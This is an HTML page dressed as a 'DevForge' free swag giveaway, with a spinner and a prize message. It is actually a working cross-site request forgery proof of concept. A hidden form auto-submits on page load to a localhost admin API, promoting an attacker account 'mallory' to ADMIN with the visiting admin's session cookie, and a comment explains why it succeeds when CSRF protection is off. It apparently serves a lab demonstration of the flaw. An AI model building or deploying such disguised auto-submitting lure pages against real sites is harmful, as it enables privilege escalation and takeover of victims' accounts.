<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DevForge Community · Free Swag Giveaway 🎉</title>
<style>
  body { font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
         background: #f6f8fa; color: #24292f; display: flex; min-height: 100vh;
         align-items: center; justify-content: center; margin: 0; }
  .box { background: #fff; border: 1px solid #d0d7de; border-radius: 12px;
         padding: 36px 40px; max-width: 420px; text-align: center;
         box-shadow: 0 8px 24px rgba(0,0,0,.08); }
  h1 { font-size: 22px; margin: 0 0 10px; }
  p { color: #57606a; font-size: 14px; }
  .spin { margin: 18px auto; width: 34px; height: 34px; border: 4px solid #d0d7de;
          border-top-color: #2f81f7; border-radius: 50%; animation: s 1s linear infinite; }
  @keyframes s { to { transform: rotate(360deg); } }
  .tag { font-size: 12px; color: #8b949e; margin-top: 18px; }
</style>
</head>
<body>
  <div class="box">
    <h1>🎉 You won DevForge swag!</h1>
    <p>Hang tight — we're loading your free sticker pack and T-shirt…</p>
    <div class="spin"></div>
    <div class="tag">devforge-community-giveaway.example</div>
  </div>

  <!--
    ===================  THE EXPLOIT  ===================
    This looks like a harmless "giveaway" page. In reality it silently forges a
    POST to the DevForge admin API. The victim is a logged-in DevForge ADMIN
    (e.g. alice) who opens this page in the same browser.

    Why it works:
      * The request goes to localhost:8080, where the admin has a live session.
      * The browser AUTOMATICALLY attaches the DevForge session cookie.
      * With CSRF protection OFF, the server has no way to tell this forged
        request apart from a genuine one from the real admin panel.
      * A plain HTML form POST is a "simple request" — no CORS preflight blocks
        it, and the attacker never needs to read the response.

    Target action: promote the attacker account "mallory" to ADMIN.
  -->
  <form id="csrf" action="http://localhost:8080/api/admin/update-role" method="POST">
    <input type="hidden" name="username" value="mallory">
    <input type="hidden" name="role" value="ADMIN">
  </form>

  <script>
    // Auto-submit the moment the page loads — no click required.
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
